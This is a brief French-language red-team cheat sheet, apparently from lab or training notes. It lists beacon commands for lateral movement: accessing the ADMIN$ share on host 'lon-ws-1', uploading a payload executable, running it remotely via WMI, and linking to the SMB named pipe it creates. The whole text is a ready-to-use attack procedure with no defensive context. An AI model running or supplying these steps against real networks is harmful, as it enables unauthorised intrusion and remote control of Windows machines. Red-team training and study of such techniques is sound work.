
Change directory sur le répertoire Windows de la target.

```
cd \\lon-ws-1\ADMIN$
```

Upload l'exécutable sur la target.

```
upload C:\Payloads\smb_x64.exe
```

Executer le PE en remote avec WMI

```
remote-exec wmi lon-ws-1 C:\Windows\smb_x64.exe
```

Faire le lien avec le named pipe crée

```
link lon-ws-1 TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337
```
